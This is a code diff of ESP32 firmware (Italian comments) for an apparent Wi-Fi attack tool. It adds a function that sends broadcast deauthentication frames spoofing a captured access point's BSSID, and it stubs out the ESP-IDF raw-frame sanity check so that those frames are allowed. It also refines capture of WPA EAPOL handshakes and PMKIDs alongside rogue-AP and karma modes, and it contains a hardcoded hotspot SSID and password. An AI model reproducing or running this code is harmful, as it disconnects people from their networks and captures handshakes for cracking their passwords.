@@ -53,6 +53,20 @@ extern "C" {
 // ============ CONFIG ============
 static const char *STA_SSID = "Hexxeted";
 static const char *STA_PASS = "lwae9180";
+static bool staWanted = false;  // join solo su richiesta (0x08/J): non disturbare l'AP
+
+// iPhone hotspot = WPA3-Personal in transizione: serve PMF capable, altrimenti
+// la STA viene rifiutata (reason 205/15). Idempotente, sicura da richiamare.
+static void staBeginPmf() {
+  WiFi.begin(STA_SSID, STA_PASS);
+  wifi_config_t wc;
+  if (esp_wifi_get_config(WIFI_IF_STA, &wc) == ESP_OK) {
+    wc.sta.pmf_cfg.capable = true;
+    wc.sta.pmf_cfg.required = false;
+    wc.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
+    esp_wifi_set_config(WIFI_IF_STA, &wc);
+  }
+}
 
 #define SERVICE_UUID "0000FFE0-0000-1000-8000-00805F9B34FB"
 #define CHR_UUID     "0000FFE1-0000-1000-8000-00805F9B34FB"
@@ -144,6 +158,14 @@ static void sniffPush(const String &s) {
 }
 
 // ============ CRC + framing ============
+// IDF blocca i deauth/disassoc con un sanity check interno: lo annulliamo,
+// altrimenti esp_wifi_80211_tx torna ESP_ERR_INVALID_ARG (258).
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  (void)arg; (void)arg2; (void)arg3;
+  return 0;
+}
+
 static uint8_t crc8(const uint8_t *d, int n) {
   uint8_t crc = 0;
   for (int i = 0; i < n; i++) {
@@ -233,7 +255,7 @@ class ChrCb : public BLECharacteristicCallbacks {
 };
 
 // ============ FASE A: capture EAPOL/PMKID/WPS (promiscuous + channel hop) ============
-struct CapFrame { uint8_t msg; uint16_t len; uint8_t data[480]; };
+struct CapFrame { uint8_t msg; uint16_t len; uint16_t ki; uint8_t data[480]; };
 struct CapSes {
   uint8_t bssid[6];
   uint8_t sta[6];
@@ -259,6 +281,7 @@ static CapSsidEntry capSsidMap[8];
 static int capSsidCount = 0;
 static bool capBackupConn = false;
 static uint8_t capBackupCh = 1;
+static int capForceCh = 0;
 static portMUX_TYPE capMux = portMUX_INITIALIZER_UNLOCKED;
 
 // ============ sniffer 802.11 (karma + PMKID + capture) ============
@@ -326,6 +349,27 @@ static void setChannel(uint8_t ch) {
 }
 
 // ============ FASE A: capture EAPOL/PMKID/WPS ============
+static uint8_t capLastBssid[6] = {0};
+static uint32_t capDeauthTx = 0;
+
+static int capDeauth(uint8_t count) {
+  if (!capOn) return -1;
+  uint8_t pkt[26];
+  pkt[0] = 0xC0; pkt[1] = 0x00;
+  pkt[2] = 0; pkt[3] = 0;
+  memset(pkt + 4, 0xFF, 6);
+  memcpy(pkt + 10, capLastBssid, 6);
+  memcpy(pkt + 16, capLastBssid, 6);
+  pkt[22] = 0; pkt[23] = 0; pkt[24] = 7; pkt[25] = 0;
+  int last = 0;
+  for (int i = 0; i < count; i++) {
+    last = (int)esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
+    if (last == 0) capDeauthTx++;
+    delay(12);
+  }
+  return last;
+}
+
 static void capHandle(const uint8_t *d, int len) {
   capFrames++;
   uint8_t ftype = (uint8_t)((d[0] >> 2) & 0x3);
@@ -334,6 +378,7 @@ static void capHandle(const uint8_t *d, int len) {
   if (ftype == 0) {
     uint8_t sub = (uint8_t)((d[0] >> 4) & 0xF);
     if ((sub == 8 || sub == 5) && len >= 38) {
+      memcpy(capLastBssid, d + 16, 6);
       int o = 36;
       while (o + 2 <= len) {
         uint8_t eid = d[o], el = d[o + 1];
@@ -377,15 +422,17 @@ static void capHandle(const uint8_t *d, int len) {
   uint8_t msg = 0;
   bool pmk = false;
   uint8_t pmkVal[16] = {0};
+  uint16_t kiVal = 0;
   if (etype == 3 && elen >= 99) {
-    uint16_t ki = (uint16_t)(d[eo + 5] | (d[eo + 6] << 8));
+    uint16_t ki = (uint16_t)((d[eo + 5] << 8) | d[eo + 6]);
+    kiVal = ki;
     bool ack = (ki >> 7) & 1, mic = (ki >> 8) & 1, sec = (ki >> 9) & 1;
     if (ack && !mic) msg = 1;
     else if (!ack && mic && !sec) msg = 2;
     else if (ack && mic) msg = 3;
     else msg = 4;
     if (msg == 1 && ds == 0x02) {
-      int kd = d[eo + 97] | (d[eo + 98] << 8);
+      int kd = (d[eo + 97] << 8) | d[eo + 98];
       int end = 99 + kd;
       if (end > elen) end = elen;
       for (int i = 99; i + 6 <= end;) {
@@ -433,14 +480,12 @@ static void capHandle(const uint8_t *d, int len) {
     for (int k = 0; k < capSsidCount; k++)
       if (memcmp(capSsidMap[k].bssid, bssid, 6) == 0) { memcpy(s.ssid, capSsidMap[k].ssid, 33); break; }
   }
-  int slot = -1;
-  for (int k = 0; k < s.n; k++) if (s.fr[k].msg == msg) { slot = k; break; }
-  if (slot < 0) {
-    if (s.n < 4) slot = s.n++;
-    else slot = 3;
-  }
+  int slot;
+  if (s.n < 4) slot = s.n++;
+  else { for (int k = 1; k < 4; k++) s.fr[k - 1] = s.fr[k]; slot = 3; }
   s.fr[slot].msg = msg;
   s.fr[slot].len = (uint16_t)flen;
+  s.fr[slot].ki = kiVal;
   memcpy(s.fr[slot].data, d, flen);
   portEXIT_CRITICAL(&capMux);
 }
@@ -455,14 +500,20 @@ static bool capStart(bool hop) {
   capHop = hop && !rogue;
   capBackupConn = (WiFi.status() == WL_CONNECTED);
   capBackupCh = (uint8_t)(capBackupConn ? WiFi.channel() : apChannel);
+  if (!capBackupConn) {
+    uint8_t hwch = 0; wifi_second_chan_t sc = WIFI_SECOND_CHAN_NONE;
+    if (esp_wifi_get_channel(&hwch, &sc) == ESP_OK && hwch >= 1 && hwch <= 14) capBackupCh = hwch;
+  }
   if (capBackupCh < 1 || capBackupCh > 14) capBackupCh = 1;
   capOn = true;
   if (rogue) {
     capCh = apChannel;
   } else {
     capCh = capHop ? (uint8_t)(capChCount ? capChList[0] : 1) : capBackupCh;
+    if (capBackupConn) { WiFi.disconnect(false); delay(40); }
+    else { WiFi.disconnect(false); delay(40); }
     setChannel(capCh);
-    if (capBackupConn) WiFi.disconnect(false);
+    if (capForceCh >= 1 && capForceCh <= 14) { capCh = (uint8_t)capForceCh; setChannel(capCh); }
   }
   capLastHop = millis();
   promiscOn();
@@ -475,14 +526,23 @@ static void capStop() {
   if (!pmkidArmed && !karmaArmed) promiscOff();
   if (!rogue) {
     setChannel(capBackupCh);
-    if (capBackupConn) WiFi.begin(STA_SSID, STA_PASS);
+    if (capBackupConn && staWanted) staBeginPmf();
   }
   Serial.printf("[cap] stop frames=%lu eapol=%lu ses=%d ch=%d\n",
                 (unsigned long)capFrames, (unsigned long)capEapol, capSesCount, capCh);
 }
 
 static void capTick() {
-  if (!capOn || !capHop || rogue) return;
+  if (!capOn || rogue) return;
+  if (!capHop) {
+    if (millis() - capLastHop > 1500) {
+      uint8_t ch = 0; wifi_second_chan_t sc = WIFI_SECOND_CHAN_NONE;
+      esp_wifi_get_channel(&ch, &sc);
+      if (ch != capCh) setChannel(capCh);
+      capLastHop = millis();
+    }
+    return;
+  }
   if (millis() - capLastHop < 350) return;
   capLastHop = millis();
   capHops++;
@@ -1149,7 +1209,16 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       WiFi.disconnect(false);
       delay(200);
       WiFi.mode(WIFI_STA);
+      staWanted = true;
       WiFi.begin(ssid, pass[0] ? pass : NULL);
+      {
+        wifi_config_t wc;
+        if (esp_wifi_get_config(WIFI_IF_STA, &wc) == ESP_OK) {
+          wc.sta.pmf_cfg.capable = true;
+          wc.sta.pmf_cfg.required = false;
+          esp_wifi_set_config(WIFI_IF_STA, &wc);
+        }
+      }
 
       joinTargetSsid = String(ssid);
       joinPending = true;
@@ -1290,7 +1359,8 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       WiFi.softAPdisconnect(true);
       delay(200);
       WiFi.mode(WIFI_STA);
-      WiFi.begin(STA_SSID, STA_PASS);
+      staWanted = true;
+      staBeginPmf();
       Serial.println("[rogue] stop → STA");
       sendFrame(0x14, 0x00, nullptr, 0);
       break;
@@ -1556,14 +1626,35 @@ void setup() {
   // WiFi STA → hotspot iPhone (non bloccante: BLE subito disponibile)
   WiFi.persistent(false);
   WiFi.mode(WIFI_STA);
+  {
+    uint8_t mac[6] = {0};
+    esp_wifi_get_mac(WIFI_IF_STA, mac);
+    bool zero = true;
+    for (int i = 0; i < 6; i++) if (mac[i]) zero = false;
+    if (zero) {
+      uint8_t m[6] = {0x02, 0x52, 0x48, 0x53, 0x00, 0x01};
+      esp_wifi_set_mac(WIFI_IF_STA, m);
+      Serial.println("[mac] era 00:00:00:00:00:00 → 02:52:48:53:00:01");
+    } else {
+      Serial.printf("[mac] STA %02X:%02X:%02X:%02X:%02X:%02X\n",
+                    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    }
+  }
   WiFi.setAutoReconnect(false);
-  WiFi.begin(STA_SSID, STA_PASS);
+  WiFi.onEvent([](WiFiEvent_t e, WiFiEventInfo_t info) {
+    Serial.printf("[wifi] STA_DISCONNECTED reason=%d\n", (int)info.wifi_sta_disconnected.reason);
+  }, ARDUINO_EVENT_WIFI_STA_DISCONNECTED);
+  WiFi.onEvent([](WiFiEvent_t e, WiFiEventInfo_t info) {
+    Serial.printf("[wifi] STA_CONNECTED ch=%d\n", (int)WiFi.channel());
+  }, ARDUINO_EVENT_WIFI_STA_CONNECTED);
+  // STA non si connette all'avvio: join solo su richiesta (evita di far
+  // cadere l'hotspot iPhone con tentativi ripetuti). BLE subito disponibile.
   WiFi.setSleep(false);
   esp_wifi_set_ps(WIFI_PS_NONE);
   esp_wifi_set_promiscuous_rx_cb(snifferCb);
 
-  Serial.printf("[RHS-ESP32 v1.0] BLE GATT FFE0/FFE1 pronto — STA %s — heap=%d\n",
-                STA_SSID, ESP.getFreeHeap());
+  Serial.printf("[RHS-ESP32 v1.0] BLE GATT FFE0/FFE1 pronto — STA %s st=%d — heap=%d\n",
+                STA_SSID, (int)WiFi.status(), ESP.getFreeHeap());
 }
 
 // ============ loop ============
@@ -1586,11 +1677,58 @@ void loop() {
     if (c == '\n' || c == '\r') {
       serCmd.trim();
       if (serCmd == "S") { Serial.printf("[cap] serial start=%d\n", capStart(true)); }
-      else if (serCmd == "R") { Serial.printf("[cap] serial fixed=%d\n", capStart(false)); }
+      else if (serCmd.startsWith("R")) {
+        capForceCh = serCmd.length() > 1 ? serCmd.substring(1).toInt() : 0;
+        bool okR = capStart(false);
+        Serial.printf("[cap] serial fixed=%d force=%d\n", okR, capForceCh);
+        capForceCh = 0;
+      }
+      else if (serCmd == "E") {
+        int rc = capDeauth(6);
+        Serial.printf("[cap] deauth bssid=%02X:%02X:%02X:%02X:%02X:%02X rc=%d tx=%lu\n",
+                      capLastBssid[0], capLastBssid[1], capLastBssid[2],
+                      capLastBssid[3], capLastBssid[4], capLastBssid[5], rc,
+                      (unsigned long)capDeauthTx);
+      }
+      else if (serCmd == "J") {
+        WiFi.disconnect(false);
+        delay(400);
+        staWanted = true;
+        staBeginPmf();
+        for (int i = 0; i < 24; i++) {
+          delay(500);
+          int st = (int)WiFi.status();
+          if (st == WL_CONNECTED) {
+            Serial.printf("[join] ok i=%d ip=%s ch=%d rssi=%d bssid=%s\n", i,
+                          WiFi.localIP().toString().c_str(), (int)WiFi.channel(),
+                          (int)WiFi.RSSI(), WiFi.BSSIDstr().c_str());
+            break;
+          }
+          if (i % 4 == 3) Serial.printf("[join] i=%d st=%d\n", i, st);
+        }
+        if (WiFi.status() != WL_CONNECTED)
+          Serial.printf("[join] FAIL st=%d\n", (int)WiFi.status());
+      }
+      else if (serCmd == "L") {
+        int n = WiFi.scanNetworks(false, true);
+        Serial.printf("[scan] n=%d\n", n);
+        for (int i = 0; i < n && i < 20; i++)
+          Serial.printf("[scan] ssid=%s ch=%d rssi=%d auth=%d\n",
+                        WiFi.SSID(i).c_str(), (int)WiFi.channel(i),
+                        (int)WiFi.RSSI(i), (int)WiFi.encryptionType(i));
+        WiFi.scanDelete();
+      }
       else if (serCmd == "Q") { capStop(); }
+      else if (serCmd == "I") {
+        Serial.printf("[sta] status=%d ch=%d rssi=%d ip=%s capCh=%d on=%d\n",
+                      (int)WiFi.status(), (int)WiFi.channel(), (int)WiFi.RSSI(),
+                      WiFi.localIP().toString().c_str(), (int)capCh, (int)capOn);
+      }
       else if (serCmd == "X") {
-        Serial.printf("[cap] frames=%lu eapol=%lu ses=%d ch=%d on=%d\n",
-                      (unsigned long)capFrames, (unsigned long)capEapol, capSesCount, capCh, (int)capOn);
+        uint8_t hwch = 0; wifi_second_chan_t sc = WIFI_SECOND_CHAN_NONE;
+        esp_wifi_get_channel(&hwch, &sc);
+        Serial.printf("[cap] frames=%lu eapol=%lu ses=%d ch=%d hwch=%d on=%d\n",
+                      (unsigned long)capFrames, (unsigned long)capEapol, capSesCount, capCh, hwch, (int)capOn);
       } else if (serCmd == "D") {
         for (int i = 0; i < capSesCount; i++) {
           CapSes &s = capSes[i];
@@ -1599,7 +1737,7 @@ void loop() {
                         s.sta[0], s.sta[1], s.sta[2], s.sta[3], s.sta[4], s.sta[5],
                         s.n, (int)s.pmkid, s.ssid);
           for (int k = 0; k < s.n; k++)
-            Serial.printf("[cap]   msg=%d len=%d\n", s.fr[k].msg, s.fr[k].len);
+            Serial.printf("[cap]   msg=%d len=%d ki=0x%04X\n", s.fr[k].msg, s.fr[k].len, s.fr[k].ki);
         }
       }
       serCmd = "";
@@ -1617,17 +1755,17 @@ void loop() {
     } else if (millis() - joinStart > 15000) {
       joinPending = false;
       WiFi.disconnect(false);
-      WiFi.begin(STA_SSID, STA_PASS);
+      if (staWanted) staBeginPmf();
       sendFrame(0x08, 0x02, (const uint8_t *)"join failed", 11);
       Serial.println("[join] FAIL → reset STA_SSID");
     }
   }
 
   static uint32_t lastReconnect = 0;
-  if (!joinPending && !pmkidArmed && !beaconActive && !rogue && !scanPending && !capOn &&
+  if (staWanted && !joinPending && !pmkidArmed && !beaconActive && !rogue && !scanPending && !capOn &&
       WiFi.status() != WL_CONNECTED && millis() - lastReconnect > 10000) {
     lastReconnect = millis();
-    WiFi.begin(STA_SSID, STA_PASS);
+    staBeginPmf();
   }
   if (WiFi.status() == WL_CONNECTED) {
     int ch = WiFi.channel();
